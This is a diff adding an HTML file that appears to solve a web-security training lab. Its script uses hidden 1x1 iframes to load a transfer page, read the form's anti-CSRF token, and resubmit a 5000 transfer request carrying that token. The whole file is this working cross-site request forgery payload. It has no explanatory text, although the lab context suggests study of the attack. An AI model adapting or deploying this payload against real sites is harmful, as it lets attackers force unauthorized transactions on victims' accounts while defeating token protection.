@@ -1,0 +1,22 @@
+<script>
+	function read_one(){
+		console.log("Reading one");
+		var one = document.getElementById("one");
+		var inbedded_doc = one.contentWindow.document;
+		var form = inbedded_doc.getElementsByName("form")[0];
+		// console.log("Type of form object: " + typeof(form));
+		var token = form.token.value;
+		console.log("Got token: " + token);
+		add_token_to_two(token);
+	}
+	function add_token_to_two(token) {
+		console.log("Adding token to two");
+		var two = document.getElementById("two");
+		two.src = "attack?Screen=1469770765&menu=900&transfer=5000" + "&token=" + token;
+		console.log("Done adding token to two");
+	}
+</script>
+
+<iframe id="one" src="attack?Screen=1469770765&menu=900&transfer=main" onload="read_one()" width="1" height="1"></iframe>
+
+<iframe id="two" width="1" height="1"></iframe>
